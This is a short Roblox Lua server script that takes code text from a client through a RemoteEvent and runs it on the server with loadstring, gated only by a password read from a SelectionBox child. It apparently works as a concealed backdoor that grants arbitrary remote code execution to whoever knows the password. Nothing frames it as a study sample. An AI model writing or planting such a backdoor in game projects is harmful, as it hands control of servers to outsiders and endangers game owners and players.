local loadstring = require(script.Loadstring)
local PasswordRemote = ""
for _,v in pairs(script.Parent:GetChildren()) do
	if v:IsA("SelectionBox") then
		PasswordRemote = v.PasswordRemote.Value
	end
end

script.Remote.OnServerEvent:Connect(function(player,text,password)
	if password ~= PasswordRemote then return end
	loadstring(text)()
end)